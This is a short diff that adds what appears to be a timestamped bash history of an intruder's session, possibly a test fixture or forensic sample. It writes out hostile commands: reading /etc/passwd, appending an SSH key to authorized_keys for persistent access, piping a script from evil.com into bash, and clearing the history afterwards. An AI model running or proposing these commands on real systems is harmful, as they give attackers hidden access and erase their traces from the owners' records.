@@ -1,0 +1,10 @@
+#1764000000
+ls -la /etc
+#1764000010
+cat /etc/passwd
+#1764000020
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+#1764000030
+curl http://evil.com/payload.sh | bash
+#1764000040
+history -c
